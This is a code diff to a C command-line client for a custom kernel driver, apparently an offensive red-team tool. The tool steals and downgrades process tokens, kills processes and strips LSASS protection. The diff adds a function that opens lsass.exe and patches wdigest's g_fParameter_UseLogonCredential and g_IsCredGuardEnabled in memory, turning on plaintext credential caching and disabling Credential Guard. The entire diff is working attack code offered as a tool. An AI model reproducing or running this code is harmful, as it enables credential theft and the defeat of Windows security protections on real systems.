@@ -1,6 +1,16 @@
 #include "defs.h"
 #include "ntoskrnl_dynamic_offset_res.h"
 #include <tlhelp32.h>
+#include <Psapi.h>
+
+
+#define DEBUG 1
+
+#if DEBUG
+#define DEBUG_PRINT(fmt, ...) printf(fmt, __VA_ARGS__)
+#else
+#define DEBUG_PRINT(fmt, ...) do {} while (0)
+#endif
 
 HANDLE hDevice;
 
@@ -57,7 +67,7 @@ BOOL modToken(DWORD32 target , DWORD32 toStealFrom){
 
     if (!result) {
 
-        printf("[ERROR] Failed to modify token of process");
+        DEBUG_PRINT("[ERROR] Failed to modify token of process");
         return -1;
     }
 }
@@ -82,12 +92,12 @@ BOOL kill(DWORD32 target) {
 
     if (!result) {
 
-        printf("[ERROR] Failed to kill process");
+        DEBUG_PRINT("[ERROR] Failed to kill process");
         return -1;
     }
 }
 
-BOOL unprotect(DWORD32 target, DWORD64 offset) {
+BOOL unprotectLsa(DWORD32 target, DWORD64 offset) {
 
 
     TASK_INFO tosend = { 0 };
@@ -110,10 +120,21 @@ BOOL unprotect(DWORD32 target, DWORD64 offset) {
 
     if (!result) {
 
-        printf("[ERROR] Failed to unprotect lsass");
+        DEBUG_PRINT("[ERROR] Failed to unprotect lsass");
         return -1;
     }
 }
+
+
+
+void resolve_kstruct_offsets() {
+
+    LoadNtoskrnlOffsetsFromInternet(TRUE);
+
+    DEBUG_PRINT("[!] EPROCESS's Protection flag at offset %lu\n", g_ntoskrnlOffsets.st.eprocess_protection);
+
+}
+
 
 void help() {
     printf("Usage: Program.exe [options]\n\n");
@@ -130,13 +151,148 @@ void help() {
 }
 
 
+BOOL DisableCredGuard() {
 
-void resolve_kstruct_offsets() {
+
+    LoadWdigestOffsetsFromInternet(TRUE);
+    if (g_wdigestOffsets.s.g_fParameter_UseLogonCredential) {
+        DEBUG_PRINT("[!] Offset of g_fParameter_UseLogonCredential is %lu\n", g_wdigestOffsets.s.g_fParameter_UseLogonCredential);
+    }
+    else {
+        DEBUG_PRINT("[-] Failed  to get offset of g_fParameter_UseLogonCredential\n");
+    }
+
+    if (g_wdigestOffsets.s.g_IsCredGuardEnabled) {
+        DEBUG_PRINT("[!] Offset of g_IsCredGuardEnabled is %lu\n", g_wdigestOffsets.s.g_IsCredGuardEnabled);
+    }
+    else {
+        DEBUG_PRINT("[-] Failed  to get offset of g_IsCredGuardEnabled\n");
+    }
 
 
-    LoadNtoskrnlOffsetsFromInternet(TRUE);
+    DWORD lsassPid = 0;
+    HANDLE hLsass = INVALID_HANDLE_VALUE;
 
-    printf("[!] EPROCESS's Protection flag at offset %lu\n", g_ntoskrnlOffsets.st.eprocess_protection);
+
+
+    lsassPid = find_pid_by_name(L"lsass.exe");
+
+
+    if (0 != lsassPid)
+    {
+        HANDLE hLsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPid);
+        if (INVALID_HANDLE_VALUE != hLsass && hLsass != NULL)
+        {
+            HMODULE hArray[256];
+            DWORD fak;
+            EnumProcessModules(hLsass, hArray, sizeof(hArray), &fak);
+
+            char szFilename[256];
+
+            for (unsigned int i = 0; i < (fak / sizeof(HMODULE)); i++)
+            {
+                GetModuleFileNameExA(hLsass, hArray[i], szFilename, 256);
+                if (strstr(szFilename, "wdigest"))
+                {
+
+                    MODULEINFO moduleInfo;
+
+                    if (GetModuleInformation(hLsass, hArray[i], &moduleInfo, sizeof(MODULEINFO)))
+                    {
+                        unsigned char* ptr = (unsigned char*)moduleInfo.lpBaseOfDll;
+
+                        //Locations of each variable
+                        LPVOID addrOfUseLogonCredentialGlobalVariable = ptr + g_wdigestOffsets.s.g_fParameter_UseLogonCredential;
+                        LPVOID addrOfCredGuardEnabled = ptr + g_wdigestOffsets.s.g_IsCredGuardEnabled;
+
+                        DWORD dwCurrent = 0xAABBCCDD;
+                        DWORD dwCurrentLength = sizeof(DWORD);
+                        SIZE_T bytesRead = 0;
+
+                        DWORD oldProtect, newProtect;
+
+                        if (ReadProcessMemory(hLsass, addrOfUseLogonCredentialGlobalVariable, &dwCurrent, dwCurrentLength, &bytesRead))
+                        {
+                            DEBUG_PRINT("\t(1) dwCurrent= %d for g_fParameter_UseLogonCredential\n", dwCurrent, bytesRead);
+                        }
+                        else {
+                            DEBUG_PRINT("(1) Failed to read memory address for g_fParameter_UseLogonCredential\n");
+                            return FALSE;
+                        }
+                            
+                        //Set g_fParameter_UseLogonCredential to 1
+                        DWORD dwUseLogonCredential = 1;
+                        SIZE_T bytesWritten = 0;
+
+                        if (!WriteProcessMemory(hLsass, addrOfUseLogonCredentialGlobalVariable, (PVOID)&dwUseLogonCredential, sizeof(DWORD), &bytesWritten))
+                        {
+                            CloseHandle(hLsass);
+                            DEBUG_PRINT("Failed at WriteMemory for g_fParameter_UseLogonCredential. Error %d \n", GetLastError());
+
+                            return FALSE;
+                        }
+
+                        if (ReadProcessMemory(hLsass, addrOfUseLogonCredentialGlobalVariable, &dwCurrent, dwCurrentLength, &bytesRead))
+                        {
+                            DEBUG_PRINT("\t(2) dwCurrent= %d for g_fParameter_UseLogonCredential\n", dwCurrent, bytesRead);
+                        }
+
+
+                        if (!VirtualProtectEx(hLsass, addrOfCredGuardEnabled, sizeof(DWORD), PAGE_READWRITE, &oldProtect))
+                        {
+                            CloseHandle(hLsass);
+                            DEBUG_PRINT("(1) Failed at virtual protect for g_IsCredGuardEnabled. Error %d \n", GetLastError());
+                            return FALSE;
+                        }
+                        if (ReadProcessMemory(hLsass, addrOfCredGuardEnabled, &dwCurrent, dwCurrentLength, &bytesRead))
+                        {
+                            printf("\t(1) dwCurrent= %d for g_IsCredGuardEnabled\n", dwCurrent, bytesRead);
+                        }
+                        else {
+                            DEBUG_PRINT("(1) Failed to read memory address for g_IsCredGuardEnabled\n");
+                            return FALSE;
+                        }
+                            
+
+                        DWORD dwCredGuard = 0;
+
+                        if (!WriteProcessMemory(hLsass, addrOfCredGuardEnabled, (PVOID)&dwCredGuard, sizeof(DWORD), &bytesWritten))
+                        {
+                            CloseHandle(hLsass);
+                            DEBUG_PRINT("Failed at WriteMemory for g_IsCredGuardEnabled. Error %d \n", GetLastError());
+                            return FALSE;
+                        }
+
+                        if (ReadProcessMemory(hLsass, addrOfCredGuardEnabled, &dwCurrent, dwCurrentLength, &bytesRead))
+                        {
+                            DEBUG_PRINT("\t(2) dwCurrent= %d for g_IsCredGuardEnabled\n", dwCurrent, bytesRead);
+                        }
+
+                        if (!VirtualProtectEx(hLsass, addrOfCredGuardEnabled, sizeof(DWORD), oldProtect, &newProtect))
+                        {
+                            CloseHandle(hLsass);
+                            DEBUG_PRINT("(2) Failed at virtual protect for g_IsCredGuardEnabled. Error %d \n", GetLastError());
+                            return FALSE;
+                        }
+                        //End creadGuard Patch 
+                        CloseHandle(hLsass);
+                        DEBUG_PRINT("Success\n");
+                        return TRUE;
+                    }
+                }
+            }
+        }
+        else
+        {
+            DEBUG_PRINT("Failed, bad lsass handle\n");
+            return FALSE;
+        }
+
+
+    }
+
+    return FALSE;
+
 
 }
 
@@ -145,6 +301,8 @@ void resolve_kstruct_offsets() {
 
 int main(int argc, char** argv)
 {
+
+    
     if (argc == 1) {
         help();
         return -1;
@@ -160,6 +318,7 @@ int main(int argc, char** argv)
     char* downgrade = NULL;
     char* tokill = NULL;
     int lsass_unprotect = 0;
+    int credGuard = 0;
 
     for (int i = 1; i < argc; i++) {
 
@@ -197,6 +356,9 @@ int main(int argc, char** argv)
         else if (strcmp(argv[i], "-l") == 0) {
             lsass_unprotect = 1;
         }
+        else if (strcmp(argv[i], "-credGuard") == 0) {
+            credGuard = 1;
+        }
         else {
             fprintf(stderr, "Unknown option: %s\n", argv[i]);
             return 1;
@@ -208,7 +370,7 @@ int main(int argc, char** argv)
     hDevice = CreateFile(L"\\\\.\\internalsRaccoon", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
 
     if (hDevice == INVALID_HANDLE_VALUE) {
-        printf("Failed to open device. Error: %d\n", GetLastError());
+        DEBUG_PRINT("Failed to open device. Error: %d\n", GetLastError());
         return 1;
     }
 
@@ -219,7 +381,7 @@ int main(int argc, char** argv)
         if (targetPid == 0) {
             targetPid = (DWORD32)GetCurrentProcessId();
         }
-        printf("Elevating %lu\n", targetPid);
+        DEBUG_PRINT("Elevating %lu\n", targetPid);
         modToken(targetPid, NULL);
     }
 
@@ -228,17 +390,17 @@ int main(int argc, char** argv)
         DWORD32 targetPid = (DWORD32)atoi(downgrade);
         DWORD32 lowPid = (DWORD32)find_pid_by_name(L"explorer.exe");
         if (lowPid != 0) {
-            printf("Downgrading %lu\n", targetPid);
+            DEBUG_PRINT("Downgrading %lu\n", targetPid);
             modToken(targetPid, lowPid);
         }
         else {
-            printf("[-] Failed to find low integrity process for downgrade\n");
+            DEBUG_PRINT("[-] Failed to find low integrity process for downgrade\n");
         }        
     }
 
     if (tokill) {
         DWORD32 targetPid = (DWORD32)atoi(tokill);
-        printf("Killing %lu\n", targetPid);
+        DEBUG_PRINT("Killing %lu\n", targetPid);
         kill(targetPid);
     }
 
@@ -247,15 +409,26 @@ int main(int argc, char** argv)
         resolve_kstruct_offsets();
         DWORD64 offset = g_ntoskrnlOffsets.st.eprocess_protection;
         if (lsass != 0 && offset) {
-            printf("Unprotecting LSASS...\n");
-            unprotect(lsass, offset);
+            DEBUG_PRINT("Unprotecting LSASS...\n");
+            unprotectLsa(lsass, offset);
         }
         else {
-            printf("[-] Failed to find LSASS.exe\n");
+            DEBUG_PRINT("[-] Failed to find LSASS.exe\n");
         }
         
     }
 
+    if (credGuard) {
+        if (DisableCredGuard()) {
+            DEBUG_PRINT("[+] Credential Guard disabled\n");
+        }
+        else {
+            DEBUG_PRINT("[-] Error Disabling Credential Guard\n");
+        }
+    }
+
+
+    
 
 
 
